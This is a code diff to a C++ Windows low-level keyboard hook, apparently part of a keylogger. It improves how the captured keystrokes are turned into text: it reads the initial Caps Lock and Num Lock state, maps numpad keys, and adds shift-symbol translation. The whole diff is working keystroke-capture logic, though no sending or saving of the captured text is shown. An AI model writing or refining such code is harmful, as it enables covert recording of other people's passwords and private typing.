@@ -69,9 +69,10 @@ LRESULT CALLBACK HookMouseCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
-        static bool capslock = false;
+        static bool capslock = GetKeyState(VK_CAPITAL);
         static bool shift = false;
-        static bool numlock = false;
+        static bool numlock = GetKeyState(VK_NUMLOCK);
+        bool shortcut = false;
         kbd_struct = *((KBDLLHOOKSTRUCT*)lParam);
         char str[0xFF] = {0};
         DWORD msg = 1;
@@ -107,42 +108,186 @@ LRESULT CALLBACK HookKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
                 if ((strcmp(str, "Enter") == 0) || (strcmp(str, "Num Enter") == 0)) {
                     strncpy(str, "\n", 0xFF);
                     printable = true;
+                    shortcut = true;
                 }
                 else if (strcmp(str, "Space") == 0) {
                     strncpy(str, " ", 0xFF);
                     printable = true;
+                    shortcut = true;
                 }
                 else if (strcmp(str, "Tab") == 0) {
                     strncpy(str, "\t", 0xFF);
                     printable = true;
+                    shortcut = true;
                 }
                 else {
                     char tmp[0xFF] = {0};
                     snprintf(tmp, 0xFF, "[%s]", str);
                     strncpy(str, tmp, 0xFF);
                 }
+                //Cause there is no known method to me to map it automatically,
+                //I have to do it manually
+                //Not using C++ map, bcs of binary size
+                if (numlock && !shortcut) {
+                    if (strcmp(str, "[Num 0]") == 0) {
+                        strncpy(str, "0", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 1]") == 0) {
+                        strncpy(str, "1", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 2]") == 0) {
+                        strncpy(str, "2", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 3]") == 0) {
+                        strncpy(str, "3", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 4]") == 0) {
+                        strncpy(str, "4", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 5]") == 0) {
+                        strncpy(str, "5", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 6]") == 0) {
+                        strncpy(str, "6", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 7]") == 0) {
+                        strncpy(str, "7", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 8]") == 0) {
+                        strncpy(str, "8", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 9]") == 0) {
+                        strncpy(str, "9", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num Del]") == 0) {
+                        strncpy(str, "[,]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num +]") == 0) {
+                        strncpy(str, "+", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num -]") == 0) {
+                        strncpy(str, "-", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num *]") == 0) {
+                        strncpy(str, "*", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num /]") == 0) {
+                        strncpy(str, "/", 0xFF);
+                    }
+                }
+                else if (!shortcut) {
+                    if (strcmp(str, "[Num 0]") == 0) {
+                        strncpy(str, "[Insert]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 1]") == 0) {
+                        strncpy(str, "[End]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 2]") == 0) {
+                        strncpy(str, "[Down]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 3]") == 0) {
+                        strncpy(str, "[Page Down]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 4]") == 0) {
+                        strncpy(str, "[Left]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 5]") == 0) {
+                        strncpy(str, "[]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 6]") == 0) {
+                        strncpy(str, "[Right]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 7]") == 0) {
+                        strncpy(str, "[Home]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 8]") == 0) {
+                        strncpy(str, "[Up]", 0xFF);
+                    }
+                    else if (strcmp(str, "[Num 9]") == 0) {
+                        strncpy(str, "[Page Up]", 0xFF);
+                    }
+                }
             }
 
             if (printable) {
-                if (shift == capslock) {
-                    str[0] = tolower(str[0]);
-                    // for (int i = 0; i < strlen(str); ++i) {
-                    //     std::cout << "\n" << strlen(str) << " and " << str << "\n";
-                    //     str[i] = tolower(str[i]);
-                    // }
+                int val = int(str[0]);
+                if (((val >= 65) && (val <= 90)) || (val >= 97 && val <= 122)) {
+                    if (shift == capslock) {
+                        str[0] = tolower(str[0]);
+                    }
+                    else {
+                        str[0] = toupper(str[0]);
+                    }
                 }
                 else {
-                    str[0] = toupper(str[0]);
-                    // for (int i = 0; i < strlen(str); ++i) {
-                    //     std::cout << "\n" << strlen(str) << " and " << str << "\n";
-                    //     str[i] = toupper(str[i]);
-                    // }
+                    if (shift) {
+                        //Same situation - function now available, map too big
+                        if (strcmp(str, "1") == 0) {
+                            strncpy(str, "!", 0xFF);
+                        }
+                        else if (strcmp(str, "2") == 0) {
+                            strncpy(str, "@", 0xFF);
+                        }
+                        else if (strcmp(str, "3") == 0) {
+                            strncpy(str, "#", 0xFF);
+                        }
+                        else if (strcmp(str, "4") == 0) {
+                            strncpy(str, "$", 0xFF);
+                        }
+                        else if (strcmp(str, "5") == 0) {
+                            strncpy(str, "%", 0xFF);
+                        }
+                        else if (strcmp(str, "6") == 0) {
+                            strncpy(str, "^", 0xFF);
+                        }
+                        else if (strcmp(str, "7") == 0) {
+                            strncpy(str, "&", 0xFF);
+                        }
+                        else if (strcmp(str, "8") == 0) {
+                            strncpy(str, "*", 0xFF);
+                        }
+                        else if (strcmp(str, "9") == 0) {
+                            strncpy(str, "(", 0xFF);
+                        }
+                        else if (strcmp(str, "0") == 0) {
+                            strncpy(str, ")", 0xFF);
+                        }
+                        else if (strcmp(str, "-") == 0) {
+                            strncpy(str, "_", 0xFF);
+                        }
+                        else if (strcmp(str, "=") == 0) {
+                            strncpy(str, "+", 0xFF);
+                        }
+                        else if (strcmp(str, "[") == 0) {
+                            strncpy(str, "{", 0xFF);
+                        }
+                        else if (strcmp(str, "]") == 0) {
+                            strncpy(str, "}", 0xFF);
+                        }
+                        else if (strcmp(str, "\\") == 0) {
+                            strncpy(str, "|", 0xFF);
+                        }
+                        else if (strcmp(str, ";") == 0) {
+                            strncpy(str, ":", 0xFF);
+                        }
+                        else if (strcmp(str, "'") == 0) {
+                            strncpy(str, "\"", 0xFF);
+                        }
+                        else if (strcmp(str, ",") == 0) {
+                            strncpy(str, "<", 0xFF);
+                        }
+                        else if (strcmp(str, ".") == 0) {
+                            strncpy(str, ">", 0xFF);
+                        }
+                        else if (strcmp(str, "/") == 0) {
+                            strncpy(str, "?", 0xFF);
+                        }
+                    }
                 }
             }
 #ifdef DEBUG
             std::cout << str;
 #endif
-            // char c = MapVirtualKey(kbd_struct.vkCode, 2);
         }
         else if(wParam == WM_KEYUP) {
             if ((strcmp(str, "Shift") == 0) || (strcmp(str, "Right Shift") == 0)) {
